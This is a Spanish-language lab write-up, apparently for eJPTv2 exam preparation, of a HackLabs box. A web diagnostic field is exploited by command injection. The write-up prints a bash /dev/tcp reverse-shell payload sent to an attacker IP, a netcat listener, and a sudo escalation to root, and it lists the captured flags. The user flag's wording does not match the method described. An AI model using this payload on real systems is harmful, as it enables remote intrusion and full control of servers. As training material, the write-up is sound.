# 🐚 Informe de Laboratorio: HackLabs - Reverse Shell 
**IP Objetivo:** 10.10.10.148 | **Fecha:** 04/05/2026 | **Objetivo:** Preparación eJPTv2

## 🎯 Objetivo
Demostrar una vulnerabilidad de inyección de comandos en un campo de diagnóstico web que permite obtener una reverse shell en el servidor como usuario `admin`, y posteriormente escalar privilegios a `root`.

## 🔍 Fase 1: Enumeración
- Se accedió al laboratorio `Reverse Shell` en `http://10.10.10.148`.
- Se identificó un formulario con un campo "URL to probe" y un botón "Check".
- La descripción indicaba que el servidor ejecuta `curl` en el campo sin sanitizar, corriendo como `admin`.

## 💥 Fase 2: Explotación (Reverse Shell)
- **Vulnerabilidad:** Inyección de comandos en el campo "URL to probe".
- **Payload:** `; bash -c 'exec bash -i &>/dev/tcp/10.10.10.5/4444 <&1'`
- **Listener:** `nc -lvnp 4444` en Kali.
- **Resultado:** Conexión recibida, shell interactiva como `admin`.

## 🚀 Fase 3: Post-explotación y Escalada
- **Flag de usuario:** `cat /home/admin/user.txt` → `HL{ssh_brut3f0rc3_l0gin_succ3ss}`
- **Escalada a root:** `sudo -l` mostró `(ALL) NOPASSWD: ALL`.
- **Comando:** `sudo su` → shell de root.
- **Flag de root:** `cat /root/root.txt` → `HL{r00t_pr1v3sc_succ3ss}`

## 🧠 Lecciones Aprendidas
1.  **Reverse Shell con bash:** Cuando `nc` no está disponible, `bash -c` con redirección a `/dev/tcp` es una alternativa efectiva.
2.  **Inyección de comandos:** Un campo de diagnóstico sin sanitizar es una puerta de entrada directa al sistema.
3.  **Escalada inmediata:** Un `sudo` mal configurado permite la escalada a root en un solo paso.

## 🏁 Conclusión
El laboratorio demuestra cómo una inyección de comandos en una herramienta de diagnóstico web permite obtener una reverse shell y, con una escalada de privilegios trivial, el control total del sistema.
